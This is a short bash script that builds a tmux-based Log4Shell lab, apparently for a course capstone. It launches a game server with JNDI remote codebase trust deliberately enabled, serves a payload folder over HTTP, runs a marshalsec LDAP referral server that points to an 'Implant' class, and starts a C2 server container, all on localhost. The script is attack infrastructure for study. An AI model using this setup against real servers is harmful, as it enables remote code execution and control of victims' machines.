#!/bin/bash

# Name of the tmux session
SESSION="lab"

# Start a new tmux session in detached mode
tmux new-session -d -s $SESSION -n "Launcher"

# Window 0: Launcher
tmux send-keys -t $SESSION:0 "prismlauncher" C-m

# Window 1: Server
tmux new-window -t $SESSION -n "Server"
tmux send-keys -t $SESSION:1 "cd ~/log4jlab/server && java -Xmx1024M -Xms1024M -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -Dcom.sun.jndi.rmi.object.trustURLCodebase=true -jar server.jar nogui" C-m

# Window 2: HTTP Server
tmux new-window -t $SESSION -n "HTTP Server"
tmux send-keys -t $SESSION:2 "cd ~/log4jlab/payload && python3 -m http.server 8888" C-m

# Window 3: Marshalsec
tmux new-window -t $SESSION -n "Marshalsec"
tmux send-keys -t $SESSION:3 "cd ~/log4jlab/marshalsec && java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 'http://127.0.0.1:8888/#Implant'" C-m

# Window 4: C2 Server
tmux new-window -t $SESSION -n "C2 Server"
tmux send-keys -t $SESSION:4 "cd ~/564Capstone/c2-server && docker start capstone-c2-server-draft" C-m

# Attach to the tmux session so you see all windows
tmux attach -t $SESSION
